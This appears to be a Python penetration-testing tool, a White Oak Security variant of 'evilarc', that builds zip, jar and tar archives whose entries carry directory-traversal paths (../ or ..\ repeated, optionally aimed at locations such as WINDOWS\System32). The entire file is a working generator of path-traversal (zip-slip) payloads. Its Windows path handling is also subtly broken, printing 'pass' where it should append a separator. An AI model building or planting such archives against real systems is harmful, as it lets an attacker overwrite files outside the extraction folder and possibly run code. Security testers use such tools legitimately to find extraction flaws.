#!/usr/bin/python
#
# Copyright (c) 2009, Neohapsis, Inc.
# All rights reserved.
#
# Implementation by Greg Ose and Patrick Toomey
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met: 
#
#  - Redistributions of source code must retain the above copyright notice, this list 
#    of conditions and the following disclaimer. 
#  - Redistributions in binary form must reproduce the above copyright notice, this 
#    list of conditions and the following disclaimer in the documentation and/or 
#    other materials provided with the distribution. 
#  - Neither the name of Neohapsis nor the names of its contributors may be used to 
#    endorse or promote products derived from this software without specific prior 
#    written permission. 
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR 
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; 
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
# ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS 
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 

#Original python 2.7 version: https://github.com/ptoomey3/evilarc

import sys, zipfile, tarfile, os, optparse

# White Oak Security - Add recursive directory support
def recurZipDir(zf,dirname,zpath):
	for subdir, dirs, files in os.walk(dirname):
		for fname in files:
			fpath = subdir + os.sep + fname
			zf.write(fpath, zpath+fpath)

def main(argv=sys.argv):
	p = optparse.OptionParser(description = 'Create archive containing a file with directory traversal', 
								prog = 'evilarc_whiteoak',
								version = '1.0',
								usage = '%prog <input file>')
	p.add_option('--output-file', '-f', dest="out", help="File to output archive to.  Archive type is based off of file extension.  Supported extensions are zip, jar, tar, tar.bz2, tar.gz, and tgz.  Defaults to evil.zip.")
	p.set_default("out", "evil.zip")
	p.add_option('--depth', '-d', type="int", dest="depth", help="Number directories to traverse. Defaults to 8.")
	p.set_default("depth", 8)
	p.add_option('--os', '-o', dest="platform", help="OS platform for archive (win|unix). Defaults to win.")
	p.set_default("platform", "win")
	p.add_option('--path', '-p', dest="path", help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")	
	p.set_default("path", "")
	options, arguments = p.parse_args()
	
	if len(arguments) != 1:
		p.error("Incorrect arguments")
		
	fname = arguments[0]
	if not os.path.exists(fname):
		sys.exit("Invalid input file")
		
	if options.platform == "win":
		dir = "..\\"
		if options.path and options.path[-1] != '\\':
			print("pass")
	else:
		dir = "../"
		if options.path and options.path[-1] != '/':
			options.path += '/'

	zpath = dir*options.depth+options.path+os.path.basename(fname)
	print("Creating " + options.out + " containing " + zpath)
	ext = os.path.splitext(options.out)[1]
	if os.path.exists(options.out):
		wmode = 'a'
	else:
		wmode = 'w'
	if ext == ".zip" or ext == ".jar":
		zf = zipfile.ZipFile(options.out, wmode)

        # directory support
		if os.path.isdir(fname):
			print("Input is a directory, recursively adding to zip file...")
			recurZipDir(zf,fname,zpath)
		else:
			zf.write(fname, zpath)
		zf.close()
		return
	elif ext == ".tar":
		mode = wmode
	elif ext == ".gz" or ext == ".tgz":
		mode = "w:gz"
	elif ext == ".bz2":
		mode = "w:bz2"
	else:
		sys.exit("Could not identify output archive format for " + ext)

	tf = tarfile.open(options.out, mode)
	tf.add(fname, zpath)
	tf.close()

if __name__ == '__main__':
     main()
